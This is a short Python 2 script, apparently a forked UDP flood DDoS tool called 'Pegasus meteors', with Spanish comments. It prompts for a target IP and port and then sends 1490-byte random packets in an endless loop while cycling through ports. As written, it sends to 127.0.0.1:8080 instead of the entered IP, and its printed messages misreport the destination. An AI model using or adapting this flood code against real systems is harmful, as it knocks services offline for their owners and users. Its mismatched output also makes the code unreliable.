import sys
import os
import time
import socket
import random
from msvcrt import getch
from datetime import datetime

#Declaracion del tiempo actual
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# El socket obtiene el dominio del conector, en este caso IPV4 y el diagrama IP.
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# genera cadena de numeros aleatorios para envio al objetivo.
bytes = random._urandom(1490)


os.system("clear")
os.system("DDos Pegasus meteors Version 1.0")
print
print "Meteoros de pegaso version 1.0"
print "Autor   : Cha0smagick"
print "github   : https://github.com/Cha0smagick"
print "forked from: https://github.com/Sanskuy/DDosAttack"
print 
ip = raw_input("IP objetivo: ")
port = input("Puerto a utilizar: ")

os.system("clear")
os.system("Pegasus meteor fists!")
sent = 0
# este es el ataque, es un while true que hace que se envien cada vez mas paquetes a puertos diferentes de la maquina objetivo.
while True:
     #Aqui por defecto se puso la ip interna del pc
     sock.sendto(bytes, ('127.0.0.1',8080))
     sent = sent + 1
     port = port + 1
     print "Se enviaron %s meteoros a %s a traves del puerto:%s"%(sent,ip,port)
     #si llega al final de los puertos, devolverse hasta el puerto 1
     if port == 65534:
          port = 1
